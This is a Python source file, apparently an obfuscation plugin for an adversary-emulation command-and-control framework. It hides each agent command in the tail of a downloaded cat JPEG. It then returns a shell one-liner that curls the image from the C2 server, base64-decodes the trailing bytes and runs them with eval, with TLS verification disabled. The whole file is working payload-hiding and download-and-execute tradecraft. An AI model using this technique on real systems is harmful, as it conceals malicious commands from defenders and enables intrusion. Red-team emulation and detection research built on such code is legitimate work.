import requests
import urllib3

from app.utility.base_obfuscator import BaseObfuscator

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Obfuscation(BaseObfuscator):

    @property
    def supported_platforms(self):
        return dict(
            darwin=['sh'],
            linux=['sh']
        )

    """ EXECUTORS """

    @staticmethod
    def sh(link):
        response = requests.get('https://aws.random.cat/meow', verify=False)
        data = response.json()
        with open('data/payloads/meow-%s.jpg' % link.id, 'wb') as meow:
            meow.write(requests.get(data['file'], verify=False).content)
            meow.write(str.encode(link.command))
        return 'curl -s -X POST -H "file:meow-%s.jpg" localhost:8888/file/download > meow-%s.jpg;eval $(tail -c %s meow-%s.jpg | base64 --decode)' % (link.id, link.id, len(link.command), link.id)
